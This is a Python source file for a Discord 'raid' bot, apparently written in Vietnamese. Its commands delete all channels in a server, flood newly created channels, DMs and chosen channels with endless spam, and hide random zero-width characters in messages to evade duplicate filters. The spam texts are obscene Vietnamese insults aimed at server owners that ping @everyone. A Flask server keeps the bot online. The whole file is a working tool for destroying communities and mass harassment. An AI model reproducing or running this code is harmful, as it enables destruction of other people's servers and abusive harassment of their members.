import discord
from discord.ext import commands
import asyncio
import threading
import random
import os
import requests
import time
from flask import Flask
from dotenv import load_dotenv
from colorama import Fore, Style, init

init(autoreset=True)
load_dotenv()

# --- CẤU HÌNH ---
TOKEN = os.getenv('DISCORD_TOKEN')
PREFIX = "!"
HEADERS = {'Authorization': f'Bot {TOKEN}'}

WAR_QUOTES = [
    "# ALO ĐÂU RỒI EM @everyone",
    "# CÚT RỒI À EM?, GÀ VẬY VÔ SOLO NÈ CON ĐĨ MÁ LỒN THẤM CHƯA CON CẶC LỒN ĐĨ OWNER SV GÀ NÓI CMM ĐI @everyone",
    "# MẤY CON ĐĨ CON MẸ GÀ VẬY MẤY CON LỒN VÔ TIẾP NÈ CON LỒN OWNER GÀ VAIZ LỒN RA JOIN SV BỐ M DẠY NÈ CON @everyone",
    "# CON LỒN ĐĨ MẸ CẦM 3 CÁI NGON TỪ ÓC CHÓ COPY HACKVIET VÔ WAR VỚI ANH MÀY HẢ CON, CÁI TRÌNH RA NGOÀI ĐƯỜNG MẤY ĐƯA NÍT CƯỜI THẤM BÀ CMM GIỜ, ĐÉO CÓ TRÌNH ĐỪNG CÓ WAR? @everyone",
    "# VÔ ĐÂY CHƠI NÈ CON CẶC LỒN 10 MẤY TUỔI MÀ T TƯỞNG MẤY THK 20 MẤY WAR GHÊ LẮM🤣 AI NGỜ MÀY CHỈ BIÊT COPY 3 CÁI DÒNG CỦA HVT THÔI GÀ THỀ VẪN LÀ GÀ TH EM ? @everyone",
    "# @everyone @here MÀY CẦM 3 CÁI NGÔN COPY CỦA MÀY GÕ VỚI ANH HẢ BỊ ANH ĐẠP VÔ CÁI HỌNG DÁI MÀY Ở BÊN BỜ ĐƯỜNG A CẦM SÚNG TỈA BÚNG VÔ CÁI LỖ HỌNG THỐI MẸ MÀY NGOÀI LỀ ĐƯỜNG CN ĐĨ MẸ MÀY ÓC CẶC BỊ ANH BEM DỒN 1 GÓC CẠNH CỦA CÁI BƯỚM MẸ MÀY THÂM NHƯ DÁI LỢN SẮP NGHẺO"
]

def get_pure_msg():
    invis = "".join(random.choices(["\u200b", "\u200c", "\u200d", "\u200e"], k=15))
    return f"{random.choice(WAR_QUOTES)} {invis}"

# --- WEB SERVER GIỮ BOT ONLINE ---
server = Flask('')
@server.route('/')
def home(): return "BANANA CAT IS RUNNING 24/7"

def run_web():
    server.run(host='0.0.0.0', port=8080)

# --- LOGIC RAID/WAR ---
def fast_spam(channel_id):
    while True:
        requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', 
                      headers=HEADERS, json={'content': get_pure_msg()})
        time.sleep(0.5)

def infinite_raid(guild_id):
    while True:
        r = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=HEADERS)
        if r.status_code == 200:
            for ch in r.json(): requests.delete(f"https://discord.com/api/v9/channels/{ch['id']}", headers=HEADERS)
        for _ in range(30):
            res = requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', 
                                headers=HEADERS, json={'name': 'raid-by-banana', 'type': 0})
            if res.status_code == 201:
                threading.Thread(target=fast_spam, args=(res.json()['id'],), daemon=True).start()
        time.sleep(20)

# --- GIAO DIỆN CMD (MENU CŨ) ---
def cmd_interface():
    while not bot.is_ready(): time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + rf"""
    ██████╗  █████╗ ███╗   ██╗ █████╗ ███╗   ██╗ █████╗ 
    ██████╔╝███████║██╔██╗ ██║███████║██╔██╗ ██║███████║
    ====================================================
    [1] SPAM ALL DMS | [2] WAR BY ID | [3] EXIT
    ====================================================
    """)
    # Trên Render lệnh input() sẽ bị bỏ qua, nhưng chạy ở máy nhà vẫn dùng được
    try:
        while True:
            choice = input(Fore.YELLOW + "👉 CHỌN LỆNH: ")
            if choice == '1':
                for ch in bot.private_channels: threading.Thread(target=fast_spam, args=(ch.id,), daemon=True).start()
            elif choice == '2':
                cid = input("ID Kênh: ")
                threading.Thread(target=fast_spam, args=(cid,), daemon=True).start()
    except EOFError:
        print(Fore.CYAN + "[!] Dang chay tren Render - CMD Interface locked.")

# --- BOT DISCORD ---
class MyBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix=PREFIX, intents=discord.Intents.all())
    async def on_ready(self):
        print(f"🔥 Bot Online: {self.user}")
    async def on_command(self, ctx):
        try: await ctx.message.delete()
        except: pass

bot = MyBot()

@bot.command()
async def war(ctx):
    threading.Thread(target=fast_spam, args=(ctx.channel.id,), daemon=True).start()

@bot.command()
async def raid(ctx):
    threading.Thread(target=infinite_raid, args=(ctx.guild.id,), daemon=True).start()

if __name__ == "__main__":
    threading.Thread(target=run_web).start() # Chạy Web Server
    threading.Thread(target=cmd_interface, daemon=True).start() # Chạy CMD Menu cũ
    bot.run(TOKEN)
